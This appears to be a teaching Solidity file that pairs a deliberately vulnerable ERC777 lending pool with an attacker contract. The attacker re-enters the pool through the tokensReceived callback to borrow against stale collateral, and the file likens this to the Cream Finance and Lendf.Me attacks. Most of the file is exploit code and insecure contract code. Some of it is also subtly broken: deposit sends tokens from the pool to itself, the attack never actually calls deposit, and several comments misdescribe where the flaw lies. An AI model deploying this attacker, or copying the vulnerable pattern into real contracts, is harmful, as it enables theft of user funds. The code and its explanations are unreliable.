// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ERC777VulnerableLending
 * @notice EXAMPLE VULNERABLE CONTRACT - DO NOT USE IN PRODUCTION
 * @dev Demonstrates cross-contract reentrancy via ERC777 callbacks
 *      Similar to the Cream Finance and Lendf.Me attacks.
 */

// Simplified ERC777 interface
interface IERC777 {
    function send(address recipient, uint256 amount, bytes calldata data) external;
    function balanceOf(address owner) external view returns (uint256);
}

// ERC777 recipient interface - contracts must implement this
interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

/**
 * @title VulnerableLendingPool
 * @notice Lending pool vulnerable to ERC777 reentrancy
 */
contract VulnerableLendingPool {
    IERC777 public token;
    
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrows;
    
    uint256 public totalDeposits;
    uint256 public totalBorrows;
    
    // Collateral factor: 75%
    uint256 public constant COLLATERAL_FACTOR = 75;
    
    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event Borrowed(address indexed user, uint256 amount);
    event Repaid(address indexed user, uint256 amount);
    
    constructor(address _token) {
        token = IERC777(_token);
    }
    
    /**
     * @notice Deposit tokens as collateral
     * @dev VULNERABLE: ERC777 tokens trigger tokensReceived callback
     *      which can be used for reentrancy
     */
    function deposit(uint256 amount) external {
        require(amount > 0, "Amount must be positive");
        
        // Update state BEFORE receiving tokens (good)
        deposits[msg.sender] += amount;
        totalDeposits += amount;
        
        // This triggers tokensReceived on the sender if they're a contract
        // The callback happens DURING the transfer
        token.send(address(this), amount, "");
        
        emit Deposited(msg.sender, amount);
    }
    
    /**
     * @notice Withdraw deposited tokens
     * @dev VULNERABLE: External call before full state update
     */
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient deposits");
        require(getBorrowCapacity(msg.sender) >= borrows[msg.sender], "Would be undercollateralized");
        
        // VULNERABILITY: State update happens, but...
        deposits[msg.sender] -= amount;
        totalDeposits -= amount;
        
        // ...ERC777 send triggers callback DURING transfer
        // Attacker can re-enter and borrow against not-yet-updated state
        token.send(msg.sender, amount, "");
        
        emit Withdrawn(msg.sender, amount);
    }
    
    /**
     * @notice Borrow tokens against collateral
     */
    function borrow(uint256 amount) external {
        uint256 capacity = getBorrowCapacity(msg.sender);
        require(borrows[msg.sender] + amount <= capacity, "Exceeds borrow capacity");
        
        borrows[msg.sender] += amount;
        totalBorrows += amount;
        
        // ERC777 callback during transfer
        token.send(msg.sender, amount, "");
        
        emit Borrowed(msg.sender, amount);
    }
    
    /**
     * @notice Calculate borrow capacity based on deposits
     * @dev This returns stale data during reentrancy!
     */
    function getBorrowCapacity(address user) public view returns (uint256) {
        return (deposits[user] * COLLATERAL_FACTOR) / 100;
    }
    
    /**
     * @notice Get user's health factor
     */
    function getHealthFactor(address user) public view returns (uint256) {
        if (borrows[user] == 0) return type(uint256).max;
        return (deposits[user] * COLLATERAL_FACTOR * 1e18) / (borrows[user] * 100);
    }
}


/**
 * @title ERC777Attacker
 * @notice Exploits ERC777 callback for reentrancy
 */
contract ERC777Attacker is IERC777Recipient {
    VulnerableLendingPool public pool;
    IERC777 public token;
    address public owner;
    
    uint256 public attackCount;
    bool public attacking;
    
    constructor(address _pool, address _token) {
        pool = VulnerableLendingPool(_pool);
        token = IERC777(_token);
        owner = msg.sender;
    }
    
    /**
     * @notice Start the attack
     */
    function attack(uint256 depositAmount) external {
        require(msg.sender == owner, "Only owner");
        
        // Step 1: Deposit tokens
        attacking = true;
        token.send(address(pool), depositAmount, abi.encodeWithSignature("deposit(uint256)", depositAmount));
    }
    
    /**
     * @notice ERC777 callback - this is where reentrancy happens
     * @dev Called by ERC777 token during send()
     */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        if (!attacking) return;
        
        attackCount++;
        
        // During the callback, we can interact with the pool
        // while it's in an inconsistent state
        
        if (attackCount < 3) {
            // Re-enter by borrowing against our deposit
            // The pool thinks we have more collateral than we do
            uint256 borrowAmount = pool.getBorrowCapacity(address(this));
            
            if (borrowAmount > 0) {
                pool.borrow(borrowAmount);
            }
        }
    }
    
    function stopAttack() external {
        attacking = false;
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.send(owner, balance, "");
        }
    }
}
